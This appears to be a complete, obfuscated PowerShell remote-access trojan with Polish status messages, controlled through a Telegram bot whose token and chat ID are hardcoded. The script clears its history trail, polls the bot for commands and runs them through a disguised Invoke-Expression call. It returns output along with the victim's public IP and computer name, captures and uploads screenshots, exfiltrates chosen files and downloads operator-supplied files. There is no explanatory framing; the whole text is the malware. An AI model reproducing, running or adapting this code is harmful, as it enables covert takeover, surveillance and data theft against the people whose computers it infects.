Clear-Host;Set-PSReadlineOption -HistorySaveStyle SaveNothing;cd $env:USERPROFILE;$v1=New-Object Microsoft.PowerShell.Commands.WebRequestSession;$v2,$v3="2118389773","8450505822:AAG_yBZaOGpYdKN4dFZTfEtNF_Vfk_71YQ0";$v4='https://api.telegram.org/bot{0}/getUpdates' -f $v3;$v5='https://api.telegram.org/bot{0}/SendMessage' -f $v3;$v6='https://api.telegram.org/bot{0}/getFile?file_id=' -f $v3;$v7='https://api.telegram.org/file/bot{0}/' -f $v3;$v8='https://api.telegram.org/bot{0}/sendDocument?chat_id={1}' -f $v3,$v2;$v9='https://api.telegram.org/bot{0}/getMe' -f $v3;$x1=$env:COMPUTERNAME;$Global:ProgressPreference='SilentlyContinue';

function x2{($a=[Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator);if($a){"Użytkownik '$env:USERNAME' ma uprawnienia administratora"}else{"Użytkownik '$env:USERNAME' nie ma uprawnień administratora"}}

function x3($f1,$f2){$f3=irm ($v6+$f1) -WebSession $v1;$f4=$f3.result.file_path;irm ($v7+$f4) -OutFile $f2 -WebSession $v1;if(test-path $f2){x5 "Plik został pobrany pomyślnie"}else{x5 "Plik nie został pobrany"}}

function x4($f5){x5 "Przystępuję do wysłania pliku [$($f5)]";if(test-path $f5 -PathType Leaf){try{curl.exe -F document=@"$f5" $v8 --insecure|Out-Null}catch{x5 "Błąd podczas przesyłania pliku: [$($Error[0])]"} }else{x5 "Wskazany plik nie został znaleziony"}}

function x6{[void][Reflection.Assembly]::LoadWithPartialName("System.Drawing");[void][Reflection.Assembly]::LoadWithPartialName("System.Windows.Forms");$a=[Int32]::MaxValue;$b=[Int32]::MaxValue;$c=[Int32]::MinValue;$d=[Int32]::MinValue;foreach($s in [Windows.Forms.Screen]::AllScreens){if($s.Bounds.X -lt $a){$a=$s.Bounds.X};if($s.Bounds.Y -lt $b){$b=$s.Bounds.Y};if(($s.Bounds.X + $s.Bounds.Width) -gt $c){$c=$s.Bounds.X + $s.Bounds.Width};if(($s.Bounds.Y + $s.Bounds.Height) -gt $d){$d=$s.Bounds.Y + $s.Bounds.Height}};$e=[Drawing.Rectangle]::FromLTRB($a,$b,$c,$d);$f=New-Object Drawing.Bitmap $e.Width,$e.Height;$g=[Drawing.Graphics]::FromImage($f);$g.CopyFromScreen($e.Location,[Drawing.Point]::Empty,$e.size);$f.Save("$env:APPDATA\s.png");$g.Dispose();$f.Dispose();x4 "$env:APPDATA\s.png";rm "$env:APPDATA\s.png" -Force}

function x5($o,$c){$o=$o -replace "([$([regex]::Escape('_*``[\'))])","\`$1";$m=@{chat_id=$v2;parse_mode="MarkdownV2";text="```````nIP: $(irm 'ident.me' -WebSession $v1)`n`SESSION ID: $x1`nPATH: [$(((Get-Location).Path).Replace('\','/'))]`nCMD: $c`n`n$o`n``````"};$m|ConvertTo-Json|%{try{irm -Method Post -Uri $v5 -Body $_ -ContentType "application/json; charset=utf-8" -WebSession $v1}catch{sleep 3}}}

function x7{try{irm -Uri $v9 -TimeoutSec 3 -EA Stop|Out-Null;$true}catch{$false}}

function x8{ $z=0;Add-Type -AssemblyName System.Windows.Forms;[System.Windows.Forms.Cursor]::Position=[System.Windows.Forms.Cursor]::Position;$y=$null;while($true){try{$t=x7;if($t -ne $y){if($t){x5 "Computer online"};$y=$t};sleep -Milliseconds 1000;$m=irm -Method Get -Uri $v4 -WebSession $v1;if(($m.result.Count -gt 0) -and ($m.result.Count -gt $z)){if($z -eq 0){$z=$m.result.Count;sleep 1;continue};$z=$m.result.Count;$n=$m.result.Message[-1];$uid=$n.chat.id;$u=$n.chat.username;$txt=$n.text;$doc=$n.document;$s=$txt.Split(" ");$txt=$s[1..($s.Length - 1)] -join " ";if($uid -notmatch $v2){x5 ('Użytkownik [{0}] {1} nieupoważniona osoba wysłała do bota następujące polecenie: {2}' -f $uid,$u,$txt)};if($txt -match "/online"){x5 "Sesja aktywna" $txt};if($s[0] -notmatch $x1){continue};if($txt -match "exit"){x5 "Sesja zabita" $txt;exit};if($txt.Length -gt 0){try{$p=$txt -split ' '|select -First 1;if($p -match "cd" -or $p -match "Set-Location"){$txt+=";ls"};$out=.(&('Get-Alias')['iex'])($txt)|Out-String}catch{$out=$Error[0]|Out-String};$chunks=for($i=0;$i -lt $out.Length;$i+=2048){$out.Substring($i,[Math]::Min(2048,$out.Length-$i))};foreach($b in $chunks){x5 ($b|Out-String) $txt;sleep -Milliseconds 100};if($out.Count -lt 1){x5 ("Polecenie wykonane: " + $txt)}};if($doc){$fid=$doc.file_id;$fname=$doc.file_name;x3 $fid $fname}}}catch{sleep 5}}$v1.Dispose()}

x8
